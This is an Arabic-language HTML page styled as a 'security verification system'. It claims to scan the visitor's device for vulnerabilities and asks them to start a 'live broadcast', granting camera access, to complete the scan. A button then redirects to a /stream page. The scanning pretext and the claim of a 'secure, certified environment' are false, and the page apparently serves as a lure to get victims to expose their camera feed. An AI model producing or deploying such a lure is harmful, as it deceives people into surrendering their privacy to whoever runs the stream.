<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام المراقبة الأمني</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0a12 0%, #1a0a2e 100%);
            color: #fff;
            font-family: 'Segoe UI', 'Cairo', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            width: 100%;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .card {
            background: rgba(20, 30, 55, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            padding: 40px 30px;
            text-align: center;
            border: 1px solid rgba(0, 255, 136, 0.4);
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
        }

        .icon {
            width: 90px;
            height: 90px;
            background: rgba(0, 255, 136, 0.1);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            border: 2px solid #00ff88;
        }

        .icon span {
            font-size: 45px;
        }

        h1 {
            color: #00ff88;
            font-size: 26px;
            margin-bottom: 10px;
        }

        .description {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }

        .btn-live {
            background: linear-gradient(90deg, #ff0000, #cc0000);
            color: #fff;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.3s;
            width: 100%;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-live:hover {
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }

        .btn-live:active {
            transform: scale(0.98);
        }

        .info-text {
            font-size: 12px;
            color: #666;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #333;
        }

        .live-badge {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #ff0000;
            border-radius: 50%;
            animation: pulse 1s infinite;
            margin-left: 8px;
        }

        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            100% { opacity: 0; transform: scale(1.5); }
        }

        .warning {
            color: #ffaa44;
            font-size: 12px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="icon">
                <span>🔒</span>
            </div>
            
            <h1>نظام التحقق الأمني</h1>
            <p class="description">
                نظام متقدم لكشف الثغرات وحماية الجهاز من الاختراقات<br>
                يرجى تفعيل البث المباشر لإكمال الفحص
            </p>

            <button class="btn-live" id="startLiveBtn">
                <span class="live-badge"></span>
                بدء البث المباشر
            </button>

            <div class="info-text">
                ⚠️ سيتم طلب الوصول إلى الكاميرا لإجراء الفحص
            </div>
            <div class="warning">
                🔒 بيئة آمنة ومعتمدة | جميع الحقوق محفوظة
            </div>
        </div>
    </div>

    <script>
        // زر التوجيه إلى صفحة البث
        const startLiveBtn = document.getElementById('startLiveBtn');
        
        startLiveBtn.addEventListener('click', () => {
            // تغيير نص الزر وإظهار التحميل
            startLiveBtn.innerHTML = '<div class="spinner" style="width:18px;height:18px;border:2px solid #fff;border-top:2px solid transparent;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block;"></div> جاري التوجيه...';
            startLiveBtn.disabled = true;
            
            // التوجيه إلى صفحة البث المباشر
            setTimeout(() => {
                window.location.href = '/stream';
            }, 500);
        });
        
        // إضافة حركة الـ spinner
        const style = document.createElement('style');
        style.textContent = `
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
